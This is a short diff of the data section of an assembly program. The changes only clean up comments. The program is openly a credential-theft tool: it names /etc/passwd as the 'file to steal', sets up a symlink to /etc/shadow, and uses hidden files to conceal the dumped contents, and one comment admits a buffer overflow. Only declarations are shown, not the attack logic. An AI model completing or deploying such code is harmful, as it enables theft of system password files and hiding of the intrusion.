@@ -1,15 +1,15 @@
 SECTION .data
-    tgtfile: db "/etc/passwd",0 ;file to steal, yo
-    dmpfile: db "dump-file",0 ;file to dump contents to, yo
+    tgtfile: db "/etc/passwd",0 ;file to steal
+    dmpfile: db "dump-file",0 ;file to dump contents to
     hidfile: db ".hid",0 ;file that will be used to hide the dumped file
     hidfile1: db ".hid1",0 ;file that will link shadow
     shadow: db "/etc/shadow",0 ;defining file to symlink
     success: db "File dumped to dump-file",0xA ;success message
     success_len: equ $-success ;len of success message
 
-    bufsize dw 1024 ;the size of our buffer, yo
+    bufsize dw 1024 ;the size of our buffer
 
-;this is where we reserve our bytes, yo
+;this is where we reserve our bytes
 SECTION .bss
     buf resb 1024 ;if the bytes in the sent data is larger than that of the reserved bytes, bof incoming
 
